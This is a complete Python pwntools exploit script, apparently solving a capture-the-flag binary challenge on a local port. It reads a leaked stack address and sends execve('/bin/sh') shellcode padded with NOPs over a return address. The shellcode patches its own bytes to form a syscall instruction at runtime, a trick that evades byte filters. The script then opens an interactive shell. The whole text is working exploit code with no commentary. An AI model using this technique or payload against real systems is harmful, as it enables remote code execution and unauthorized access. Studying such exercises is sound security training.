from pwn import *

context.arch = 'amd64'

script = '''
    b *0x0000000000401206
    c
'''

p = remote('127.0.0.1', 2005)
#p = process('./chall')
#p = gdb.debug('./chall', gdbscript=script)

p.recvuntil(b"sekitar: ")
stack_leak = int(p.recvline().strip(), 16)
log.info(f"Leaked Stack Address: {hex(stack_leak)}")

shellcode = asm('''
    xor rax, rax
    push rax
    mov rax, 0x68732f2f6e69622f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 59

    add byte ptr [rip + 7], 1
    add byte ptr [rip + 1], 1
    .byte 0x0e, 0x04
''')

payload = shellcode
payload = payload.ljust(88, b"\x90")
payload += p64(stack_leak)

p.send(payload)
p.interactive()
